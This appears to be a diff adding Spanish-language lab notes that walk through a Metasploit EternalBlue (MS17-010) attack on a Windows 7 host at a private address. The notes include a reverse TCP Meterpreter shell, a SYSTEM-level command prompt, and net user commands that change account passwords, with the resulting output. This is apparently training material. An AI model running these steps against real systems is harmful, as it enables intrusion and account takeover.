@@ -444,4 +444,44 @@ Matching Modules
 Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                      
 After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'                                                        
 
-msf > 
+# 1. Iniciamos Metasploit y buscamos el exploit
+ismael@ismael:~$ msfconsole -q
+msf6 > search eternalblue
+
+# 2. Seleccionamos el módulo de MS17-010
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# 3. Configuramos los parámetros necesarios
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.0.181
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.0.0.5
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+# 4. Lanzamos el ataque
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+
+[*] Started reverse TCP handler on 10.0.0.5:4444 
+[*] 10.0.0.181:445 - Connecting to target...
+[+] 10.0.0.181:445 - EternalBlue success!
+[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.181:49158)
+
+# 5. Entramos a la shell de Windows de la víctima
+meterpreter > shell
+Process 1234 created.
+Channel 1 created.
+Microsoft Windows [Versión 6.1.7601]
+
+# 6. Ejecutamos los retos de administración
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> net user lola ismael55
+Se ha completado el comando correctamente.
+
+C:\Windows\system32> net user administrador LoLa
+Se ha completado el comando correctamente.
+
+C:\Windows\system32> ipconfig
+Adaptador de Ethernet Conexión de área local:
+   Dirección IPv4. . . . . . . . . . . . : 10.0.0.181
+   Máscara de subred . . . . . . . . . . : 255.255.255.0
+   Puerta de enlace predeterminada . . . : 10.0.0.1
